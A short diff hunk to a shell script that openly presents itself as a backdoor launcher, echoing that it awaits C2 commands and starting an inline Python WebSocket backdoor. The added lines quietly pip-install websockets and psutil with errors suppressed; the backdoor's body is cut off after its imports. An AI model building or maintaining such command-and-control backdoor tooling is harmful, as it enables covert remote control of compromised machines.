@@ -72,6 +72,9 @@ echo ""
 echo "[*] Backdoor active — awaiting C2 commands..."
 echo ""
 
+echo "[*] Checking payload dependencies..."
+python3 -m pip install -q --user websockets psutil 2>/dev/null
+
 # --- Python WebSocket backdoor (inline) ---
 python3 - "$PID1" "$PID2" "$PID3" << 'PYEOF'
 import sys, asyncio, json, os, signal
